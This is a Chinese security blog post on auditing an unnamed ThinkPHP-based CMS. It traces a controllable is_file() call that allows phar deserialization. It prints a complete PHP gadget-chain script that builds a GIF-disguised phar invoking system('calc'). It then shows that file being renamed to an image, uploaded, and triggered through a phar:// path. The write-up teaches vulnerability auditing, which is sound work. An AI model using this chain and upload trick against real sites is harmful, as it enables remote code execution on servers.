#  某CMS源码RCE审计思路   
原创 Ambition  进击安全   2024-09-26 13:52  
  
**免责申明**  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
  
**一、前言**  
  
****  
****这个依旧是一个学员审计出来的案例，今天拿出来分享一下，这个漏洞是基于phar反序列化的一个漏洞RCE利用方式，我们来查看漏洞点。  
  
**二、漏洞分析**  
  
    首先这个代码是一个ThinkPHP框架开发的一个项目，在代码当中可以看到第110行代码当中存在一个is_file方法，这个方法是进行判断xx文件是否存在。  
  
刚好is_file方法是能够触发我们的phar反序列化漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDypO379sxpTgdGMCwPlgR1pWUiaJibkw8kbvwaiaDiakRfZaBibGrPxYcw3mw/640?wx_fmt=png&from=appmsg "")  
  
Get()函数代码110行is_file函数中$filename参数可控，而is_file函数又在get()函数中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyxRZspmCuTiaOMp93M4yic8bU0n2sibdCZCCTric7XavCwAt972tTtVxBLg/640?wx_fmt=png&from=appmsg "")  
  
继续寻找read方法查看哪里调用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyK05EV9X4Ph8baMwwRRibdAM97BUpkRdqaWSuXkNic4YQIZA4rWCrx56A/640?wx_fmt=png&from=appmsg "")  
  
函数file_info()在代码108行调用了read()函数，继续查看哪里调用file_info。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyQGvJ9tQxTARUES8hmTobfUJKEJRMOjgCyTSrEiabGX4svtwVIn5qrZg/640?wx_fmt=png&from=appmsg "")  
  
    好，全程是可控的，并且代码是  
TP开发的框  
架，我们从网上找到对应的反序列化链子，这里链子在下面，使  
用反序列化链生成phar文件，phar文件不会受到文件后缀名的影响，我们生成jpg就可以。  
```
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
{
            $this->files = array($files);
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $append = array("smi1e" => "1");
    }

    trait Attribute
    {
        private $data;
        private $withAttr = array("smi1e" => "system");

        public function get()
{
            $this->data = array("smi1e" => "calc");
        }
    }
}
namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
{
        public function __construct()
{
            $this->get();
        }
    }
}

namespace {

    $conver = new think\model\Pivot();
    $a = new think\process\pipes\Windows($conver);


    $phar = new Phar('hkey.phar');
    $phar -> stopBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($a);
    $phar -> stopBuffering();
}
?>
```  
  
生成文件之后我们改名为jpg，进行触发功能点。  
  
**三、漏洞利用**  
  
生成出来文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyy4SEdI9lyKgLBOyHwzIAcIOz4e985L7Lx2UVZ8seO9leCwPaZarHuw/640?wx_fmt=png&from=appmsg "")  
  
生成出来文件之后改为png图片（改为png主要是方便我们上传）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyGibfUq4sYicKOHmda73T2TUy9aVN47AxIYHMN3KHTDMiao2QoMyBRs77Q/640?wx_fmt=png&from=appmsg "")  
  
进行上传。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyXlNFsh4PsjQeic32ycA0hW8NPHqDasAEbeB50QB0BfTWs7e7nsgpKFw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDycgrMibUmGCDgIXUnz3SNCiac4HwpEOgicgHcYKzcxFmTXu7sMlsS5GhkA/640?wx_fmt=png&from=appmsg "")  
  
拿到对应路径之后开始利用。  
  
访问我们审计出来的功能点地址。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyeict9KNr6AzQGt7uYNvQa7FoePQ96GteJvSQ4rx0JLDZ7YoqTiaCcGiaQ/640?wx_fmt=png&from=appmsg "")  
  
抓包修改为phar://上传png图片地址  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhVyOL7cO77fVjH4vRRKHHDyq5W1nqpPS8EtLr2az5aNsIZpuicwBgHGq5I5Aw7SdNoFxJFUgylIsRg/640?wx_fmt=png&from=appmsg "")  
  
弹出计算机！  
  
关于phar反序列化，如果大家不懂的可以自行百度了解，还是挺值得分析的。  
  
**四、完结**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg "")  
  
  
